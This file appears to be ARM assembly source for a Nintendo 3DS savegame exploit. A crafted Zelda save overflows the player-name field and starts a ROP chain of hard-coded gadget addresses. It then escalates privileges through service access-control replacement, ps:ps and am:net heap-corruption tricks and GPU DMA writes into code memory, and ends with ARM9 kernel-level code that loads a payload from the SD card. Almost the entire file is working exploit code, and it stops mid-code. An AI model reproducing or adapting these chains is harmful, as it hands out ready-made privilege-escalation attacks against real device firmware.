.arm
.section .init
.global _start

#define svcControlMemory 0x301a0c
#define svcConnectToPort 0x2fa7b8
#define svcGetProcessId 0x30794c

#define srvinit_RegisterClient 0x30df98 //Calls srv_RegisterClient(), increments *r6, L_30aedc(sp+0), then executes "pop {r3, r4, r5, r6, r7, pc}". L_30aedc decreases *(inr0+8) by 1, and returns if that's >0 after decreasing it.
#define srv_GetServiceHandle 0x30dde8

#define GETPROCID 0x409bec //Calls svcGetProcessId, "mov r0, r4", then pop {r3, r4, r5, pc}
#define CLOSEHANDLE 0x400ae4+4 //mov r4, r0. ptr = inr0, if(*ptr)svcCloseHandle(*ptr). *ptr = 0, r0 = ptr, "pop {r4, pc}".
#define THROWFATALERR 0x3351b4
#define COND_THROWFATALERR 0x2135ec //This calls THROWFATALERR if r0 bit31 is set, then executes: pop {r3, r4, r5, r6, r7, r8, r9, pc}
#define GETTHREADSTORAGE 0x2db5ac //Stores r0 from "mrc 15, 0, r0, cr13, cr0, {3}" to r3+4, increments the word @ r3+8, r0=1 then pop {r4} bx	lr
#define LDRR0 0x2d1230 //ldr r0, [r0] then bx lr
#define ADDSHIFTVAL_BLXR3 0x3201dc //r4 = r0 + r1<<2. classptr = *(r5+0x38). Calls vtable funcptr +16 with r3 for the funcptr, r2=*r4, r1=<ptr loaded from pool>
#define SLEEP_THREAD 0x30e604

#define CODE_ALIGNEDSIZE 0x45b000

#if FWVER < 0x25
#define TEXTGSPHEAPADDR (0x18000000 - CODE_ALIGNEDSIZE) //Addr of .text relative to the GSP heap @ FCRAM+0 / vaddr 0x14000000.
#else
#define TEXTGSPHEAPADDR (0x18000000 - CODE_ALIGNEDSIZE) + 0x5B000
#endif

#if REGION==1 //USA
#define SENDCMDADR 0x4360a0 //Writes r0 to r4+0, then copies 0x80-bytes from r1 to r4+4. Then uses svcSendSyncRequest with handle *r5.
#define GXLOWCMD_0 0x49398c
#define GXLOWCMD_4 0x493b94 //inr0=src addr inr1=dst addr inr2=size inr3=width0? insp0=height0? insp4=width1? insp8=height1? insp12=flags
#define GSP_CMD8 0x453f44 //inr0 = addr, inr1 = size
#define THREADINIT_LOCALSTORAGE 0x435f68 //This is the initialization func called by the thread entrypoint code, prior to calling the actual thread entrypoint funcptr.
#define svcCreateThread 0x422180
#elif REGION==2 //EUR
#define SENDCMDADR 0x4360c4
#define GXLOWCMD_0 0x4939ac
#define GXLOWCMD_4 0x493bb4
#define GSP_CMD8 0x453f64
#define THREADINIT_LOCALSTORAGE 0x435f8c
#define svcCreateThread 0x4221a4
#else
#error Invalid region.
#endif

#define RDSAVEBEGINADR 0x324eac+4
#define WRSAVEBEGINADR 0x2e613c+4
#define SAVECTXDESTORYADR 0x31b99c+0xc
#define FSMNTSAVEADR 0x2fc0c8+4 //This is after this instruction: "push {r3, r4, r5, lr}"
#define FSUMNTADR 0x2fbfa8+4

#define REGPOPADR 0x4a5c80 //Addr of this instruction: "pop {r0, r1, r2, r3, r4, r5, r6, fp, ip, pc}"
#define REGPOP24ADR 0x1aca7c //Addr of this instruction: "pop {r4, r5, r6, r7, r8, r9, sl, fp, pc}"
#define REGPOPR0R3SL 0x4a8964 //Addr of this instruction: "pop {r0, r1, r2, r3, sl, ip, pc}"
#define REGPOPR5R6 0x4b7cb0 //Addr of this instruction: "pop {r5, r6, pc}"
#define POPPC 0x1048a4 //Addr of this instruction: "pop {pc}"
#define INFINLPADR 0x139501
#define BLXR6 0x2c45e0 //Executes "blx r6", increments r4, then if r4>=16 executes vpop {d8}, pop {r4, r5, r6, r7, r8, r9, sl, pc}
#define STACKMEMCPYADR 0x1aa988
#define MEMCPY 0x34338c
#define MEMSET 0x32b184 //r0=adr, r1=size. The first instruction here is "r2=0", therefore jumping to +4 allows controlling the value which is written to the buffer.

#define RSAINFO_OFF 0x880+0x40

#define SAVEADR 0x587958
#define SAVESLOTSADR 0x55bec0
#define SRVACCESS_OFF 0xf00 //Savegame offset for the new service access control.
#define ARM9CODE_OFF 0xb00+0x40
#define ARM9CODE_SIZE 0x200-0x40
#define ARM11CODE_OFF 0xd00
#define ARM11CODE_SIZE 0x200

#define HAXWORD 0x58584148

#if EXECHAX==2
//#define REPLACE_FSREG_ACCESSCONTROL 1
#define REPLACE_SRVACCESSCONTROL
#endif

#if EXECHAX==0 || EXECHAX==3
#define ARM9HAX 1
#endif

#if ARM9HAX==1 || REPLACE_FSREG_ACCESSCONTROL==1
#define REPLACE_SRVACCESSCONTROL
#endif

#ifdef ARM9HAX
#if FWVER != 0x1F && FWVER != 0x18
#error "The specified FWVER is not supported."
#endif

#if FWVER == 0x1F
#define PXIFS_STATEPTR 0x0809797c
#define ARM9_ARCHIVE_MNTSD 0x8061451
#define ARM9_GETARCHIVECLASS 0x8063f91
#define DATAOUTCLASS_VTABLEPTR 0x080944c8

#define PXIPS9_BUF 0x080c3ee0
#elif FWVER == 0x18
#define PXIFS_STATEPTR 0x080c473c
#define ARM9_ARCHIVE_MNTSD 0x806145d
#define ARM9_GETARCHIVECLASS 0x8064029
#define DATAOUTCLASS_VTABLEPTR 0x08094328

#define PXIPS9_BUF 0x080c4420
#endif
#endif

#define PSPS_SIGBUFSIZE 0x7440//FW0B=0xD9B8.

#define START_ROPTHREAD
#define THREADSTART_ROPCHAINOFF 0x13dc

#if EXECHAX==3
#define HEAPHAX_HEAPCTX 0x80a2e80
#define HEAPHAX_HEAPBUF HEAPHAX_HEAPCTX-0x2800//Addr of the ARM9 heap buffer where the input data for amnet cmd 0x08190108 is copied to.
#define DIFF_FILEREAD_FUNCPTR 0x080952c0+8//This is the addr of the funcptr used by the DIFF verification code for reading data, via a class vtable.
#define DIFF_FILEREAD_FUNCADR 0x08065275//The original func addr from the above funcptr, before it's overwritten.
#define HEAPHAX_INPUTBUF 0x08000000//SAVESLOTSADR
#define HEAPHAX_BUFSIZE 0x2800
#define HEAPCHUNK_SAVEOFF 0xf80
#define HEAPOFF_ARM9CODE 0x4
#endif

.macro SENDCMD HANDLE, CMDID, BUF
.word REGPOPADR
.word 0, 0, 0 @ r0-r2
.word SAVEADR+0x1040 @ r3
.word 0x0f @ r4
.word 0 @ r5
.word GETTHREADSTORAGE @ r6
.word 0 @ fp
.word 0 @ ip
.word BLXR6

.word 0 @ r4 popped by GETTHREADSTORAGE

.word 0, 0 @ d8
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6
.word 0 @ r7
.word 0 @ r8
.word 0 @ r9
.word 0 @ sl
.word REGPOPADR

.word SAVEADR+0x1044 @ r0
.word 0x20 @ r1
.word 0 @ r2
.word 0 @ r3
.word 0x10 @ r4
.word 0 @ r5
.word LDRR0 @ r6
.word 0 @ fp
.word 0 @ ip
.word BLXR6

.word 0, 0 @ d8
.word 0 @ r4
.word SAVEADR+0x1018 @ r5, +0x38 is a classptr.
.word 0 @ r6
.word 0 @ r7
.word 0 @ r8
.word 0 @ r9
.word 0 @ sl
.word ADDSHIFTVAL_BLXR3

.word \CMDID @ r0, CmdID
.word \BUF @ r1, 0x80-byte buf copied to cmdbuf+4
.word 0 @ r2
.word 0 @ r3
.word 0 @ sl
.word 0 @ ip
.word REGPOPR5R6

.word \HANDLE @ r5, Handle*
.word 0 @ r6
.word SENDCMDADR

.word 0 @ r4
.word 0 @ r5
.word 0 @ r6
#if EXECHAX!=3 //The .ctx install command will return an error since the input data is invalid, therefore disable this conditional fatal-error call when using the .ctx install cmd hax.
.word COND_THROWFATALERR

.word 0, 0, 0, 0, 0, 0, 0
#endif
.endm

_start:
.word 0xbb, 0x01, 0x8000, 0xe0ba, 0x1, 0x57, 0x57
.hword 0x48, 0x61, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78 @ UTF-16 "Haxxxxxx"
.byte 0x9a + 0x14 @ Length of player-name in wchars, so byte-size is u8 value<<1.
.byte 0x01, 0x02, 0x00
.ascii "ZELDAZ"
.hword 0x428
.word 0xdfdfdfdf
.word 0x8 @ This value overwrites the wchar length u32 stored in the ctx when the player-name is copied to the ctx, therefore use a value which won't cause other crashes.

.byte 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x02, 0x60, 0xf4, 0x01, 0x00, 0x00
.byte 0x65, 0x00, 0x01, 0x00, 0x01, 0x01, 0x00, 0x00, 0x3b, 0x06, 0x0f, 0x02
.byte 0x27, 0x06, 0x0d, 0x02, 0x17, 0x00, 0x22, 0x11, 0x3c, 0x0f, 0x45, 0x02
.byte 0x0b, 0x0d, 0x18, 0x02, 0x09, 0x00, 0x32, 0x13, 0x00, 0x00, 0x00, 0x00
.word 0x00, 0x00, 0x00
.byte 0x00, 0x00, 0x34, 0x00, 0x3c, 0x03, 0x45, 0x02, 0x0b, 0x03, 0x18, 0x02
.byte 0x09, 0x00, 0x32, 0x11, 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x08
.byte 0x09, 0x0b, 0xff, 0x0d, 0x0e, 0x0f, 0x10, 0x11, 0x12, 0x13, 0x1a, 0x18
.byte 0x18, 0xff, 0x2e, 0x27, 0x45, 0x46, 0x14, 0x1e, 0x0f, 0x22, 0x00, 0x00
.byte 0x1c, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x09, 0x73, 0x77
.byte 0xcb, 0xe2, 0x24, 0x00, 0xff, 0xff, 0xff, 0x30, 0x06, 0x06, 0x06, 0x07
.byte 0x07, 0x07, 0x07, 0x07, 0x06, 0x06, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00
.byte 0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00
.byte 0x00, 0xff, 0xff, 0x00, 0x00, 0x00, 0xff, 0xff, 0x00, 0xff, 0xff, 0x14
.byte 0x43, 0x00, 0x00, 0x00, 0x7f, 0x00, 0x00, 0x00, 0xff, 0x9f, 0x79, 0x82
.byte 0x50, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
.byte 0xff, 0x07, 0x00, 0x00, 0xf8, 0x00, 0x00, 0x00, 0x3f, 0x00, 0x00, 0x00
.byte 0xff, 0xdf, 0x36, 0xef, 0x60, 0x60, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
.byte 0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00
.byte 0xff, 0x07, 0x00, 0x00, 0xff, 0xdf, 0x7f, 0xb7
.word 0x6f40, 0x4, 0x0
.word 0x7fff, 0xc0, 0xfa6f, 0xf3f7e3ff
.word 0x253060

.word REGPOPADR
.word 0 @ r0: Doesn't matter here, since the code jumped to immediately does "mov r0, sp".
#ifndef START_ROPTHREAD
.word SAVEADR+0x180 @ r1: Buffer which will be copied to stack.
.word 0x700 @ r2: Size of data to copy.
#else
.word SAVEADR+THREADSTART_ROPCHAINOFF @ r1: Src buffer
.word 0x80 @ r2
#endif
.word 0 @ r3
.word SAVEADR @ r4
.word 0, 0, 0, 0
.word STACKMEMCPYADR @ After copying the data to stack, this func calls L_3508b8, see below.

.space (_start + 0x180) - .

/*#ifdef START_ROPTHREAD
.word 0 @ r0
.word 0 @ r1
.word 0 @ r2
.word 0 @ r3
.word 0x0f @ r4
.word 0 @ r5
.word THREADINIT_LOCALSTORAGE @ r6
.word 0 @ fp
.word 0 @ ip
.word BLXR6

.word 0, 0 @ d8
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6
.word 0 @ r7
.word 0 @ r8
.word 0 @ r9
.word 0 @ sl
#endif*/

.word 0 @ r0
.word 0 @ r1
.word 0 @ r2
.word 0 @ r3
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6
.word 0 @ fp
.word 0 @ ip

#ifdef REPLACE_SRVACCESSCONTROL
.word REGPOPADR
.word 0x00558ad4 @ r0, Ptr to the "srv:" handle.
.word 0 @ r1
.word 0 @ r2
.word 0 @ r3
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6
.word 0 @ fp
.word 0 @ ip
.word CLOSEHANDLE

.word 0 @ r4

.word REGPOPADR
.word 0x00558ad4 @ r0, Output handle
.word 0x4e7485 @ r1, service name. 0x4e7480 is "srv:", 0x4e7485 is "srv:pm".
.word 0 @ r2
.word 0 @ r3
.word 0x0f @ r4
.word 0 @ r5
.word svcConnectToPort @ r6
.word 0 @ fp
.word 0 @ ip
.word BLXR6

.word 0, 0 @ d8
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6
.word 0 @ r7
.word 0 @ r8
.word 0 @ r9
.word 0 @ sl
.word COND_THROWFATALERR

.word 0 @ r3
.word 0 @ r4
.word 0 @ r5
.word SAVEADR+0x13bc @ r6
.word 0 @ r7
.word 0 @ r8
.word 0 @ r9
.word srvinit_RegisterClient

.word SAVEADR+0x13bc @ r3/sp0
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6
.word 0 @ r7

.word REGPOPADR
.word SAVEADR+0x1080 @ r0
.word 0xffff8001 @ r1
.word 0 @ r2
.word 0 @ r3
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6
.word 0 @ fp
.word 0 @ ip
.word GETPROCID

.word 0, 0, 0

SENDCMD 0x00558ad4, 0x04040040, SAVEADR+0x1080 @ Unregister this process from srv:pm.
SENDCMD 0x00558ad4, 0x04030082, SAVEADR+0x1080 @ Register this process with srv:pm, with new service access control.
#endif

#if EXECHAX==0
.word REGPOPADR
.word SAVEADR+0x1040 @ r0, Out handle
.word SAVEADR+SRVACCESS_OFF + 0x9*8 @ r1, Service name ptr "ps:ps".
.word 5 @ r2, Service name length
.word 0 @ r3
.word 0x0f @ r4
.word 0 @ r5
.word srv_GetServiceHandle @ r6
.word 0 @ fp
.word 0 @ ip
.word BLXR6

.word 0, 0 @ d8
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6
.word 0 @ r7
.word 0 @ r8
.word 0 @ r9
.word 0 @ sl

.word COND_THROWFATALERR
.word 0, 0, 0, 0, 0, 0, 0

.word REGPOPADR
.word 0x08000000 @ r0, Dst signature buffer+0
.word SAVEADR+ARM9CODE_OFF @ r1, Src ARM9 code
.word ARM9CODE_SIZE @ r2
.word 0 @ r3
.word 0x0f @ r4
.word 0 @ r5
.word MEMCPY @ r6
.word 0 @ fp
.word 0 @ ip
.word BLXR6 @ Copy the ARM9 code to the beginning of the signature buffer.

.word 0, 0 @ d8
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6
.word 0 @ r7
.word 0 @ r8
.word 0 @ r9
.word 0 @ sl

.word REGPOPADR
.word 0x08000000+0x200 @ r0, Buffer
.word PSPS_SIGBUFSIZE-0x200 @ r1, Size
.word PXIPS9_BUF @ r2
.word 0 @ r3
.word 0x0f @ r4
.word 0 @ r5
.word MEMSET+4 @ r6
.word 0 @ fp
.word 0 @ ip
.word BLXR6

.word 0, 0 @ d8
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6
.word 0 @ r7
.word 0 @ r8
.word 0 @ r9
.word 0 @ sl

SENDCMD SAVEADR+0x1040, 0x00020244, SAVEADR+0x1100

.word THROWFATALERR
@.word INFINLPADR

#endif

#if EXECHAX==3
.word REGPOPADR
.word SAVEADR+0x1040 @ r0, Out handle
.word SAVEADR+SRVACCESS_OFF + 0xb*8 @ r1, Service name ptr "am:net".
.word 6 @ r2, Service name length
.word 0 @ r3
.word 0x0f @ r4
.word 0 @ r5
.word srv_GetServiceHandle @ r6
.word 0 @ fp
.word 0 @ ip
.word BLXR6

.word 0, 0 @ d8
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6
.word 0 @ r7
.word 0 @ r8
.word 0 @ r9
.word 0 @ sl

.word COND_THROWFATALERR
.word 0, 0, 0, 0, 0, 0, 0

.word REGPOPADR
.word HEAPHAX_INPUTBUF @ r0, Buffer
.word HEAPHAX_BUFSIZE @ r1, Size
.word 0xffffffff @ r2
.word 0 @ r3
.word 0x0f @ r4
.word 0 @ r5
.word MEMSET+4 @ r6
.word 0 @ fp
.word 0 @ ip
.word BLXR6

.word 0, 0 @ d8
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6
.word 0 @ r7
.word 0 @ r8
.word 0 @ r9
.word 0 @ sl

.word REGPOPADR
.word HEAPHAX_INPUTBUF @ r0, Dst buffer
.word SAVEADR+RSAINFO_OFF @ r1, Src RSA-2048 "cert" used to trigger an error so that the .ctx install cmd aborts processing the cert buffer data.
.word 0x280 @ r2
.word 0 @ r3
.word 0x0f @ r4
.word 0 @ r5
.word MEMCPY @ r6
.word 0 @ fp
.word 0 @ ip
.word BLXR6

.word 0, 0 @ d8
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6
.word 0 @ r7
.word 0 @ r8
.word 0 @ r9
.word 0 @ sl

.word REGPOPADR
.word HEAPHAX_INPUTBUF+HEAPOFF_ARM9CODE @ r0, Dst buffer
.word SAVEADR+ARM9CODE_OFF @ r1, Src ARM9 code
.word ARM9CODE_SIZE @ r2
.word 0 @ r3
.word 0x0f @ r4
.word 0 @ r5
.word MEMCPY @ r6
.word 0 @ fp
.word 0 @ ip
.word BLXR6

.word 0, 0 @ d8
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6
.word 0 @ r7
.word 0 @ r8
.word 0 @ r9
.word 0 @ sl

.word REGPOPADR
.word HEAPHAX_INPUTBUF+HEAPOFF_ARM9CODE+0x200+0x88 @ r0, Dst buffer
.word SAVEADR+HEAPCHUNK_SAVEOFF @ r1, Src memchunk header
.word 0x10 @ r2
.word 0 @ r3
.word 0x0f @ r4
.word 0 @ r5
.word MEMCPY @ r6
.word 0 @ fp
.word 0 @ ip
.word BLXR6

.word 0, 0 @ d8
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6
.word 0 @ r7
.word 0 @ r8
.word 0 @ r9
.word 0 @ sl

.word REGPOPADR
.word HEAPHAX_INPUTBUF+0x2800 @ r0, Dst buffer
.word SAVEADR+HEAPCHUNK_SAVEOFF+0x10 @ r1, Src memctx data
.word 0x3c+8 @ r2
.word 0 @ r3
.word 0x0f @ r4
.word 0 @ r5
.word MEMCPY @ r6
.word 0 @ fp
.word 0 @ ip
.word BLXR6 @ Copy the heap memctx data to heapbuf+0x2800.

.word 0, 0 @ d8
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6
.word 0 @ r7
.word 0 @ r8
.word 0 @ r9
.word 0 @ sl

SENDCMD SAVEADR+0x1040, 0x08190108, SAVEADR+0x1180 @ CTX install cmd
SENDCMD SAVEADR+0x1040, 0x00190040, SAVEADR+0x1200 @ ReloadDBS

//.word THROWFATALERR
//.word INFINLPADR
.word HAXWORD
#endif

#if EXECHAX==1 //This code exec method reads the first 0x400-bytes of the save00.bin to .text. This only works prior to system version 4.0.0-7, with FW1D/4.0.0-7 this causes a kernel panic.
.word REGPOPADR
.word 0x3071d8 @ r0
.word 0 @ r1
.word 0 @ r2
.word 0 @ r3
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6
.word 0 @ fp
.word 0 @ ip
.word FSMNTSAVEADR @ Mount the savegame "data:" archive.

.word 0, 0, 0
.word REGPOPADR
.word SAVEADR+0x1000 @ r0, File path
.word 0x2cd2b4 @ r1, Buffer
.word ARM11CODE_OFF+ARM11CODE_SIZE @ r2, Size
.word 0 @ r3
.word 0, 0, 0, 0, 0
.word RDSAVEBEGINADR

.word 0, 0, 0, 0, 0, 0, 0
.word SAVECTXDESTORYADR

.word 0
.word REGPOPADR
.word 0x3071d8
.word 0, 0, 0
.word 0, 0, 0, 0, 0
.word FSUMNTADR

.word 0, 0, 0, 0, 0, 0
.word 0x2cd2b4+ARM11CODE_OFF
#endif

#if EXECHAX==2

#if REPLACE_FSREG_ACCESSCONTROL==1
.word REGPOPADR
.word SAVEADR+0x1180 @ r0, Dst
.word SAVEADR+0x1080 @ r1, Src
.word 0x4 @ r2
.word 0 @ r3
.word 0x0f @ r4
.word 0 @ r5
.word MEMCPY @ r6
.word 0 @ fp
.word 0 @ ip
.word BLXR6

.word 0, 0 @ d8
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6
.word 0 @ r7
.word 0 @ r8
.word 0 @ r9
.word 0 @ sl

.word REGPOPADR
.word SAVEADR+0x1040 @ r0, Out handle
.word SAVEADR+SRVACCESS_OFF + 0x8*8 @ r1, Service name ptr "fs:REG".
.word 6 @ r2, Service name length
.word 0 @ r3
.word 0x0f @ r4
.word 0 @ r5
.word srv_GetServiceHandle @ r6
.word 0 @ fp
.word 0 @ ip
.word BLXR6

.word 0, 0 @ d8
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6
.word 0 @ r7
.word 0 @ r8
.word 0 @ r9
.word 0 @ sl

.word COND_THROWFATALERR
.word 0, 0, 0, 0, 0, 0, 0

SENDCMD SAVEADR+0x1040, 0x04020040, SAVEADR+0x1180 @ Unregister this process from fs:REG.
SENDCMD SAVEADR+0x1040, 0x040103C0, SAVEADR+0x1180 @ Register this process with fs:REG.

.word THROWFATALERR
//.word INFINLPADR
#endif

.word REGPOPADR
.word 0x14700000 @ r0, Dst
.word SAVEADR+ARM11CODE_OFF @ r1, Src ARM11 code
.word ARM11CODE_SIZE @ r2
.word 0 @ r3
.word 0x0f @ r4
.word 0 @ r5
.word MEMCPY @ r6
.word 0 @ fp
.word 0 @ ip
.word BLXR6

.word 0, 0 @ d8
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6
.word 0 @ r7
.word 0 @ r8
.word 0 @ r9
.word 0 @ sl

.word REGPOPADR
.word 0x14700000 @ r0, Addr
.word ARM11CODE_SIZE @ r1, Size
.word 0 @ r2
.word 0 @ r3
.word 0x0f @ r4
.word 0 @ r5
.word GSP_CMD8 @ r6
.word 0 @ fp
.word 0 @ ip
.word BLXR6 @ Flush the DCache for the code copied to 0x14700000.

.word 0, 0 @ d8
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6
.word 0 @ r7
.word 0 @ r8
.word 0 @ r9
.word 0 @ sl

.word REGPOPADR//This code exec method uses GX command4 to copy arm11code using GPU DMA, to .text.
.word 0x14700000 @ r0, GPU DMA src addr
.word TEXTGSPHEAPADDR @ r1, GPU DMA dst addr
.word ARM11CODE_SIZE @ r2, size
.word 0 @ r3, width0
.word 0x0f @ r4
.word 0 @ r5
.word GXLOWCMD_4 @ r6
.word 0 @ fp
.word 0 @ ip
.word BLXR6

/*.word REGPOPADR//This code exec method uses GX command0 to DMA arm11code from the savegame, to .text, via svcStartInterProcessDma(). This isn't usable with FW1F since this causes GSP module to terminate, it's unknown whether this was exploitable on older NATIVE_FIRM versions.
.word 0x00100000 @ r0, DMA dst addr 0x00100000 0x14313890 0x30dbd4
.word 0x1f300000 @ r1, DMA src addr SAVEADR+0x300 0x1f300000
.word 0x46500*2 + 0x10 @ r2, size 0x200
.word 0 @ r3, unused by GSP module
.word 0x0f @ r4
.word 0 @ r5
.word GXLOWCMD_0 @ r6
.word 0 @ fp
.word 0 @ ip
.word BLXR6*/

.word 0, 0 @ d8 / insp0 = height0, insp4 = width1
.word 0 @ insp8 = height1
.word 0x8 @ insp12, flags
.word 0, 0, 0, 0, 0
.word COND_THROWFATALERR
.word 0, 0, 0, 0, 0, 0, 0

.word REGPOPADR @ Call sleep_thread() since GX commands returns before the operation finishes.
.word 1000000000 @ r0
.word 0 @ r1
.word 0 @ r2
.word 0 @ r3
.word 0x0f @ r4
.word 0 @ r5
.word SLEEP_THREAD @ r6
.word 0 @ fp
.word 0 @ ip
.word BLXR6

.word 0, 0 @ d8
.word 0
.word 0, 0, 0, 0, 0, 0
.word 0x00100000
//.word INFINLPADR
#endif

/*.word REGPOPADR
.word 0x5ae878
.word 0x0
.word 0x2
.word 0x0
.word 0x0, 0x0, 0x0, 0x0, 0x0
.word THROWFATALERR+0x18 @ Display the "gamecard was removed" error screen, where you can return to home menu instead of completely shutting down.*/

#if EXECHAX==0
.space (_start + RSAINFO_OFF) - . @ ps:ps RSA ctx
.space (_start + RSAINFO_OFF + 0x200) - . @ RSA modulo and exponent = zeros.
.word PSPS_SIGBUFSIZE<<3 @ RSA bit-size, for the signature.
.word 0
#elif EXECHAX==3
.space (_start + RSAINFO_OFF) - . @ RSA-4096 "cert", used with the .ctx install cmd.
.word 0x3000100 @ Big-endian signature-type 0x10003, for RSA-4096 SHA256.
.space (_start + RSAINFO_OFF + 0x280) - .
#endif

#ifdef ARM9HAX
.space (_start + ARM9CODE_OFF) - . @ ARM9 code
#if EXECHAX==3
b arm9code
.word 0, 0, 0 @ For heaphaxx, branch around the data overwritten by the ARM9 CTR-SDK heap code.
#endif
arm9code:
push {r0, r1, r2, r3, r4, r5, r6, r7, lr}
sub sp, sp, #48

sub r1, pc, #12
ldr r0, =0xffff8001
mov r2, #ARM9CODE_SIZE
svc 0x00000054

orr ip, pc, #1
bx ip

.thumb
ldr r5, =PXIFS_STATEPTR
ldr r5, [r5]
add r5, r5, #8 @ r5 = state
ldr r1, =0x2EA0
add r0, r5, r1
add r1, sp, #8
ldr r4, =ARM9_ARCHIVE_MNTSD
blx r4

mov r3, #0
str r3, [sp, #28]
str r3, [sp, #0]
str r3, [sp, #4]
add r0, sp, #16
mov r1, r5
ldr r2, [sp, #8]
ldr r3, [sp, #12]
ldr r4, =ARM9_GETARCHIVECLASS
blx r4

ldr r6, [sp, #28]

add r0, sp, #36
mov r1, #4
str r1, [r0]
mov r1, #0x22
str r1, [r0, #8]
adr r1, arm9_filepath
str r1, [r0, #4]

mov r0, #0
str r0, [sp, #32]
mov r3, #1
str r3, [sp, #0]
str r0, [sp, #4]
add r1, sp, #32
mov r2, #0
add r3, sp, #36
mov r0, r6
ldr r4, [r0]
ldr r4, [r4, #8]
blx r4 //openfile

ldr r7, [sp, #32]

mov r0, r7
add r1, sp, #20
ldr r4, [r7]
ldr r4, [r4, #16]
blx r4 //getfilesize

mov r0, r7
adr r1, arm9_loadaddr
mov r2, #4
mov r3, #0
bl fileread

mov r0, r7
ldr r1, arm9_loadaddr
ldr r2, [sp, #20]
sub r2, r2, #4
mov r3, #4
bl fileread

cmp r0, #0
bne arm9fail

ldr r0, =0xffff8001
ldr r1, arm9_loadaddr
ldr r2, [sp, #20]
sub r2, r2, #4
blx svcFlushProcessDataCache

add sp, sp, #48

ldr r0, arm9_loadaddr
blx r0

#if EXECHAX==3
ldr r0, [sp, #0x24]
bl heaphaxa9_restoreheap
ldr r0, =DIFF_FILEREAD_FUNCPTR
ldr r1, =DIFF_FILEREAD_FUNCADR
str r1, [r0]
#endif

ldr r0, [sp, #0x20]
mov lr, r0
pop {r0, r1, r2, r3, r4, r5, r6, r7}
add sp, sp, #4

#if EXECHAX==3
ldr r7, =DIFF_FILEREAD_FUNCADR//for FW1F
bx r7
#endif

arm9code_end:
b arm9code_end
.pool

arm9fail:
ldr r0, =HAXWORD
blx r0
.pool

fileread:
push {r3, r4, lr}
sub sp, sp, #24
add r3, sp, #16
str r2, [sp, #8]
ldr r2, =DATAOUTCLASS_VTABLEPTR
str r2, [r3]
str r1, [r3, #4]
str r3, [sp, #0]
mov r1, #0
str r1, [sp, #4]
add r1, sp, #12
ldr r2, [sp, #24]
mov r3, #0

ldr r4, [r0]
ldr r4, [r4, #0x38]
blx r4 //readfile
add sp, sp, #24
pop {r3, r4, pc}
.pool

#if EXECHAX==3
heaphaxa9_restoreheap:
push {r4}
sub r0, r0, #0x10 @ r0 = DU chunkhdr for the save-read output buffer.
mov r1, #0xf
mvn r1, r1 @ r1 = -0x10
str r1, [r0, #4] @ Set the DU chunkhdr chunk-size to -0x10. if(((DUchunkhdr_addr + 0x10 + chunksize) - RFchunkhdradr) < 0x10)this triggers return 0 from RF chunk mem free code without writing to heap chunkhdrs/memctx ptrs. The DU chunkhdr here is located 0x4 bytes after the RF chunkhdr due to alignment.

ldr r0, =(HEAPHAX_HEAPCTX + 24 + 0x24)
ldr r1, [r0, #8] @ r1 = addr of first heap DU chunkhdr.

heaphaxa9_restoreheap_findheapendDU: @ r1 = last DU chunkhdr in the linked-list.
cmp r1, #0
beq heaphaxa9_restoreheap_end
ldr r2, [r1, #12]
cmp r2, #0
beq heaphaxa9_restoreheap_findheapendDU_finish
mov r1, r2
b heaphaxa9_restoreheap_findheapendDU

heaphaxa9_restoreheap_findheapendDU_finish:
ldr r1, [r1, #8] @ Since this code is executed before the output-buf DU chunk is unlinked which was allocated via the heaphax RF chunk, the last chunk is the output-buf DU chunk. Therefore, set r1 to the DU chunkhdr which was originally the last chunkhdr in the linked-list, prior to using the ReloadDBS command.
cmp r1, #0
beq heaphaxa9_restoreheap_end

ldr r3, =0x4652 @ "RF"
mov r4, #2
heaphaxa9_restoreheap_findRF:
add r1, r1, #4
ldr r2, [r1]
cmp r2, r3
beq heaphaxa9_restoreheap_findRF_found
b heaphaxa9_restoreheap_findRF @ Find the RF chunkhdr following the above DU chunkhdr, which doesn't have a DU chunkhdr immediately after this RF chunkhdr.
heaphaxa9_restoreheap_findRF_found:
sub r4, r4, #1
cmp r4, #0
bgt heaphaxa9_restoreheap_findRF

str r1, [r0, #0] @ Write the above RF memchunkhdr ptr to the heapctx RF chunkhdr ptrs.
str r1, [r0, #4]

heaphaxa9_restoreheap_end:
pop {r4}
bx lr
.pool
#endif

.arm
svcFlushProcessDataCache:
svc 0x00000054
bx lr
#endif

#ifdef ARM9HAX
arm9_filepath:
.hword 0x2F, 0x33, 0x64, 0x73, 0x68, 0x61, 0x78, 0x5F, 0x61, 0x72, 0x6D, 0x39, 0x2E, 0x62, 0x69, 0x6E, 0x00 //UTF-16 "/3dshax_arm9.bin"
.align 2

arm9_loadaddr:
.word 0

.space (_start + ARM9CODE_OFF + ARM9CODE_SIZE) - . @ ARM9 code section end.
#endif

#ifndef ARM9HAX
.space (_start + ARM11CODE_OFF) - .
arm11code:
sub sp, sp, #4
